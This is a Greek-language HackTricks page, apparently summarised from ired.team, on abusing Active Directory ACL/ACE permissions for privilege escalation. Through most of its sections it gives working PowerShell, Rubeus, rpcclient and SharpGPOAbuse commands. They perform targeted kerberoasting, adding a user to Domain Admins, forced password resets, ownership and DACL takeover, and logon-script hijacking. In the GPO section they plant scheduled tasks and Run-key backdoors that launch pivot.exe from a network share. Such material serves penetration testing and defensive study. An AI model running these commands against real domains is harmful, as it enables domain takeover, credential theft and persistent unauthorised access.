# Κατάχρηση των ACLs/ACEs του Active Directory

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) **και** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **αποθετήρια του github.**

</details>

**Αυτή η σελίδα είναι κυρίως ένας περίληψη των τεχνικών από** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **και** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Για περισσότερες λεπτομέρειες, ελέγξτε τα αρχικά άρθρα.**

## **Γενικά Δικαιώματα GenericAll στον Χρήστη**

Αυτό το προνόμιο παρέχει σε έναν επιτιθέμενο πλήρη έλεγχο επί του λογαριασμού χρήστη στόχου. Μόλις επιβεβαιωθούν τα δικαιώματα `GenericAll` χρησιμοποιώντας την εντολή `Get-ObjectAcl`, ένας επιτιθέμενος μπορεί:

* **Αλλαγή του Κωδικού του Στόχου**: Χρησιμοποιώντας την εντολή `net user <όνομα_χρήστη> <κωδικός> /domain`, ο επιτιθέμενος μπορεί να επαναφέρει τον κωδικό του χρήστη.
* **Κερβερικό Roasting με Στόχευση**: Αναθέτει ένα SPN στον λογαριασμό του χρήστη για να γίνει δυνατή η επίθεση kerberoasting, στη συνέχεια χρησιμοποιεί τα εργαλεία Rubeus και targetedKerberoast.py για να εξάγει και να προσπαθήσει να αποκρυπτογραφήσει τα hashes των εισιτηρίων που χορηγούνται (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
* **Στοχευμένο ASREPRoasting**: Απενεργοποιήστε την προελεγμένη πιστοποίηση για τον χρήστη, καθιστώντας τον λογαριασμό του ευάλωτο στο ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Γενικά Δικαιώματα στην Ομάδα**

Αυτό το προνόμιο επιτρέπει σε έναν εισβολέα να χειριστεί τα μέλη μιας ομάδας εάν έχει `Γενικά Δικαιώματα` σε μια ομάδα όπως οι `Domain Admins`. Αφού εντοπίσει το διακριτικό όνομα της ομάδας με την εντολή `Get-NetGroup`, ο εισβολέας μπορεί:

* **Προσθήκη του ίδιου στην Ομάδα Domain Admins**: Αυτό μπορεί να γίνει μέσω άμεσων εντολών ή χρησιμοποιώντας εργαλεία όπως το Active Directory ή το PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Η κατοχή αυτών των προνομίων σε ένα αντικείμενο υπολογιστή ή σε έναν λογαριασμό χρήστη επιτρέπει:

* **Περιορισμένη Αναθεώρηση Πόρων Kerberos**: Επιτρέπει την ανάληψη ενός αντικειμένου υπολογιστή.
* **Σκιώδεις Διαπιστεύσεις**: Χρησιμοποιήστε αυτήν την τεχνική για να υποκαταστήσετε έναν υπολογιστή ή έναν λογαριασμό χρήστη εκμεταλλευόμενο τα προνόμια για τη δημιουργία σκιώδων διαπιστεύσεων.

## **WriteProperty on Group**

Αν ένας χρήστης έχει δικαιώματα `WriteProperty` σε όλα τα αντικείμενα για ένα συγκεκριμένο γκρουπ (π.χ., `Domain Admins`), μπορεί:

* **Προσθήκη του ίδιου στην Ομάδα Domain Admins**: Επιτυγχάνεται μέσω του συνδυασμού των εντολών `net user` και `Add-NetGroupUser`, αυτή η μέθοδος επιτρέπει την ανόδο στα επίπεδα προνομίων εντός του τομέα.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Αυτο-Μέλος (Αυτο-Μέλετη) σε Ομάδα**

Αυτό το προνόμιο επιτρέπει στους επιτιθέμενους να προσθέσουν τον εαυτό τους σε συγκεκριμένες ομάδες, όπως οι `Domain Admins`, μέσω εντολών που ρυθμίζουν τη μέληση στην ομάδα απευθείας. Χρησιμοποιώντας την παρακάτω ακολουθία εντολών επιτρέπεται η προσθήκη του εαυτού:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Αυτο-Μέλος)**

Μια παρόμοια προνομιούχα δυνατότητα, αυτή επιτρέπει σε επιτιθέμενους να προσθέσουν απευθείας τον εαυτό τους σε ομάδες τροποποιώντας τις ιδιότητες των ομάδων αν έχουν το δικαίωμα `WriteProperty` σε αυτές τις ομάδες. Η επιβεβαίωση και εκτέλεση αυτού του προνομίου γίνεται με:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Η κατοχή του `ExtendedRight` σε έναν χρήστη για το `User-Force-Change-Password` επιτρέπει την επαναφορά κωδικών πρόσβασης χωρίς την ανάγκη γνώσης του τρέχοντος κωδικού. Η επαλήθευση αυτού του δικαιώματος και η εκμετάλλευσή του μπορεί να γίνει μέσω PowerShell ή εναλλακτικών εργαλείων γραμμής εντολών, προσφέροντας πολλαπλές μεθόδους για την επαναφορά κωδικού ενός χρήστη, συμπεριλαμβανομένων διαδραστικών συνεδριών και μονοεντολικών εντολών για μη διαδραστικά περιβάλλοντα. Οι εντολές κυμαίνονται από απλές εκκινήσεις PowerShell μέχρι τη χρήση του `rpcclient` στο Linux, επιδεικνύοντας την ευελιξία των διανυσμάτων επίθεσης.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Εάν ένας επιτιθέμενος ανακαλύψει ότι έχει δικαιώματα `WriteOwner` πάνω σε ένα γκρουπ, μπορεί να αλλάξει την ιδιοκτησία του γκρουπ σε εαυτόν. Αυτό είναι ιδιαίτερα σημαντικό όταν το γκρουπ που αφορά είναι τα `Domain Admins`, καθώς η αλλαγή της ιδιοκτησίας επιτρέπει ευρύτερο έλεγχο των χαρακτηριστικών του γκρουπ και της συμμετοχής. Η διαδικασία περιλαμβάνει την εντοπισμό του σωστού αντικειμένου μέσω της `Get-ObjectAcl` και στη συνέχεια τη χρήση της `Set-DomainObjectOwner` για την τροποποίηση του ιδιοκτήτη, είτε με βάση το SID είτε το όνομα.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite στον Χρήστη**

Αυτή η άδεια επιτρέπει σε έναν εισβολέα να τροποποιήσει τις ιδιότητες του χρήστη. Συγκεκριμένα, με πρόσβαση στο `GenericWrite`, ο εισβολέας μπορεί να αλλάξει τη διαδρομή του σεναρίου σύνδεσης ενός χρήστη για να εκτελέσει ένα κακόβουλο σενάριο κατά τη σύνδεση του χρήστη. Αυτό επιτυγχάνεται χρησιμοποιώντας την εντολή `Set-ADObject` για να ενημερώσετε την ιδιότητα `scriptpath` του στόχου χρήστη ώστε να δείχνει στο σενάριο του εισβολέα.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite στην Ομάδα**

Με αυτό το προνόμιο, οι επιτιθέμενοι μπορούν να χειριστούν την συμμετοχή σε ομάδες, όπως την προσθήκη τους ή άλλων χρηστών σε συγκεκριμένες ομάδες. Αυτή η διαδικασία περιλαμβάνει τη δημιουργία ενός αντικειμένου διαπιστευτικών, τη χρήση του για την προσθήκη ή αφαίρεση χρηστών από μια ομάδα και την επαλήθευση των αλλαγών στη συμμετοχή με εντολές PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Το να είστε ο κάτοχος ενός αντικειμένου AD και να έχετε δικαιώματα `WriteDACL` σε αυτό επιτρέπει σε έναν επιτιθέμενο να χορηγήσει στον εαυτό του δικαιώματα `GenericAll` στο αντικείμενο. Αυτό επιτυγχάνεται μέσω της διαχείρισης ADSI, επιτρέποντας πλήρη έλεγχο επί του αντικειμένου και τη δυνατότητα να τροποποιήσει τα μέλη των ομάδων του. Παρόλα αυτά, υπάρχουν περιορισμοί όταν προσπαθείτε να εκμεταλλευτείτε αυτά τα δικαιώματα χρησιμοποιώντας τα cmdlets `Set-Acl` / `Get-Acl` του Active Directory module.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Αναπαραγωγή στο Domain (DCSync)**

Η επίθεση DCSync εκμεταλλεύεται συγκεκριμένες άδειες αναπαραγωγής στο domain για να μιμηθεί ένα Domain Controller και να συγχρονίσει δεδομένα, συμπεριλαμβανομένων των διαπιστευτηρίων χρήστη. Αυτή η ισχυρή τεχνική απαιτεί άδειες όπως `DS-Replication-Get-Changes`, επιτρέποντας στους επιτιθέμενους να εξάγουν ευαίσθητες πληροφορίες από το περιβάλλον του AD χωρίς άμεση πρόσβαση σε ένα Domain Controller. [**Μάθετε περισσότερα για την επίθεση DCSync εδώ.**](../dcsync.md)

## Ανάθεση GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Ανάθεση GPO

Η ανάθεση πρόσβασης για τη διαχείριση των αντικειμένων ομάδας πολιτικής (GPOs) μπορεί να παρουσιάσει σημαντικούς κινδύνους ασφάλειας. Για παράδειγμα, αν ένας χρήστης όπως `offense\spotless` έχει ανατεθεί δικαιώματα διαχείρισης GPO, μπορεί να έχει προνόμια όπως **WriteProperty**, **WriteDacl**, και **WriteOwner**. Αυτές οι άδειες μπορούν να καταχραστούν για κακόβουλους σκοπούς, όπως αναγνωρίζεται χρησιμοποιώντας το PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Απαρίθμηση Δικαιωμάτων GPO

Για την εντοπισμό λανθασμένα διαμορφωμένων GPOs, μπορούν να συνδεθούν μαζί τα cmdlets του PowerSploit. Αυτό επιτρέπει τον εντοπισμό των GPOs στα οποία ένας συγκεκριμένος χρήστης έχει δικαιώματα διαχείρισης: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Υπολογιστές με Εφαρμοσμένη μια Δεδομένη Πολιτική**: Είναι δυνατόν να εντοπιστούν ποιοι υπολογιστές εφαρμόζουν μια συγκεκριμένη GPO, βοηθώντας στην κατανόηση της εμβέλειας του δυνητικού αντίκτυπου. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Πολιτικές που Εφαρμόζονται σε Έναν Δεδομένο Υπολογιστή**: Για να δείτε ποιες πολιτικές εφαρμόζονται σε ένα συγκεκριμένο υπολογιστή, μπορούν να χρησιμοποιηθούν εντολές όπως `Get-DomainGPO`.

**Οργανωτικές Μονάδες με Εφαρμοσμένη μια Δεδομένη Πολιτική**: Η εντοπισμός των οργανωτικών μονάδων (OUs) που επηρεάζονται από μια δεδομένη πολιτική μπορεί να γίνει χρησιμοποιώντας το `Get-DomainOU`.

### Κατάχρηση GPO - New-GPOImmediateTask

Λανθασμένα διαμορφωμένα GPOs μπορούν να εκμεταλλευτούν για την εκτέλεση κώδικα, για παράδειγμα, δημιουργώντας μια άμεση προγραμματισμένη εργασία. Αυτό μπορεί να γίνει για να προστεθεί ένας χρήστης στην τοπική ομάδα διαχειριστών στους επηρεαζόμενους υπολογιστές, ανεβάζοντας σημαντικά τα προνόμια:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### Εκμετάλλευση του GroupPolicy module - Κατάχρηση του GPO

Το GroupPolicy module, εάν είναι εγκατεστημένο, επιτρέπει τη δημιουργία και σύνδεση νέων GPOs, καθώς και την ρύθμιση προτιμήσεων όπως οι τιμές του μητρώου για την εκτέλεση backdoors σε πληγωμένους υπολογιστές. Αυτή η μέθοδος απαιτεί την ενημέρωση του GPO και τη σύνδεση ενός χρήστη στον υπολογιστή για την εκτέλεση:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Κατάχρηση GPO

Το SharpGPOAbuse προσφέρει έναν τρόπο για την κατάχρηση υπαρχόντων GPOs προσθέτοντας εργασίες ή τροποποιώντας ρυθμίσεις χωρίς την ανάγκη δημιουργίας νέων GPOs. Αυτό το εργαλείο απαιτεί τροποποίηση των υπαρχόντων GPOs ή χρήση εργαλείων RSAT για τη δημιουργία νέων πριν εφαρμοστούν οι αλλαγές:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Ενημέρωση Εξαναγκαστικής Πολιτικής

Οι ενημερώσεις των GPO συνήθως συμβαίνουν περίπου κάθε 90 λεπτά. Για να επιταχυνθεί αυτή η διαδικασία, ειδικά μετά την εφαρμογή μιας αλλαγής, η εντολή `gpupdate /force` μπορεί να χρησιμοποιηθεί στον στόχο υπολογιστή για να εξαναγκαστεί μια άμεση ενημέρωση της πολιτικής. Αυτή η εντολή εξασφαλίζει ότι οποιεσδήποτε τροποποιήσεις στα GPO εφαρμόζονται χωρίς να περιμένουν για τον επόμενο αυτόματο κύκλο ενημερώσεων.

### Κάτω από το Καπό

Μετά την επιθεώρηση των Προγραμματισμένων Εργασιών για ένα συγκεκριμένο GPO, όπως το `Misconfigured Policy`, μπορεί να επιβεβαιωθεί η προσθήκη εργασιών όπως το `evilTask`. Αυτές οι εργασίες δημιουργούνται μέσω σεναρίων ή εργαλείων γραμμής εντολών με σκοπό την τροποποίηση της συμπεριφοράς του συστήματος ή την ανάδειξη προνομίων.

Η δομή της εργασίας, όπως φαίνεται στο αρχείο διαμόρφωσης XML που δημιουργείται από το `New-GPOImmediateTask`, περιγράφει τις λεπτομέρειες της προγραμματισμένης εργασίας - συμπεριλαμβανομένης της εντολής που θα εκτελεστεί και των ενεργοποιητών της. Αυτό το αρχείο αντιπροσωπεύει τον τρόπο με τον οποίο καθορίζονται και διαχειρίζονται οι προγραμματισμένες εργασίες εντός των GPO, παρέχοντας έναν τρόπο για την εκτέλεση αυθαίρετων εντολών ή σεναρίων ως μέρος της επιβολής πολιτικής.

### Χρήστες και Ομάδες

Τα GPO επιτρέπουν επίσης τη χειραγώγηση των μελών χρηστών και ομάδων σε συστήματα στόχου. Με την επεξεργασία των αρχείων πολιτικής Χρηστών και Ομάδων απευθείας, οι επιτιθέμενοι μπορούν να προσθέσουν χρήστες σε προνομιούχες ομάδες, όπως η τοπική ομάδα `διαχειριστές`. Αυτό είναι δυνατό μέσω της ανάθεσης δικαιωμάτων διαχείρισης GPO, τα οποία επιτρέπουν την τροποποίηση των αρχείων πολιτικής για την περίληψη νέων χρηστών ή την αλλαγή μελών ομάδων.

Το αρχείο διαμόρφωσης XML για Χρήστες και Ομάδες περιγράφει πώς υλοποιούνται αυτές οι αλλαγές. Με την προσθήκη καταχωρήσεων σε αυτό το αρχείο, συγκεκριμένοι χρήστες μπορούν να λάβουν αυξημένα προνόμια σε όλα τα επηρεαζόμενα συστήματα. Αυτή η μέθοδος προσφέρει έναν άμεσο τρόπο για την ανάδειξη προνομίων μέσω της χειραγώγησης των GPO.

Επιπλέον, μπορούν να ληφθούν υπόψη και επιπλέον μέθοδοι για την εκτέλεση κώδικα ή τη διατήρηση της μόνιμης παρουσίας, όπως η εκμετάλλευση σεναρίων σύνδεσης/αποσύνδεσης, η τροποποίηση κλειδιών μητρώου για αυτόματες εκκινήσεις, η εγκατάσταση λογισμικού μέσω αρχείων .msi ή η επεξεργασία ρυθμίσεων υπηρεσιών. Αυτές οι τεχνικές παρέχουν διάφορους τρόπους για τη διατήρηση πρόσβασης και τον έλεγχο των συστημάτων στόχου μέσω της κατάχρησης των GPO.
